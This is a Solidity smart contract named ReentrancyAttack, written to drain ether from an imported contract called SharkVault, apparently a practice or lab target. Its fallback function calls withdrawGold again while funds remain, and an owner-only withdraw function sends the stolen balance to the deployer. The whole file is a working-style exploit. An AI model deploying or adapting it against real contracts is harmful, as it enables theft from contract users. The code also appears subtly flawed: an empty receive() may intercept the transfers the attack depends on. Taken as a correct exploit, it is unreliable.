// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./SharkVault.sol";

contract ReentrancyAttack {
    SharkVault public sharkVault;
    address public owner;

    constructor(SharkVault _sharkVault) {
        sharkVault = _sharkVault;
        owner = msg.sender;
    }

    // Fallback function to be called during the reentrancy attack
    fallback() external payable {
        if (address(sharkVault).balance >= 1 ether) {
            sharkVault.withdrawGold(1 ether);
        }
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        // Deposit the initial amount of gold
        sharkVault.depositGold{value: 1 ether}(0
        );

        // Start the reentrancy attack
        sharkVault.withdrawGold(1 ether);
    }

    // Function to withdraw the stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
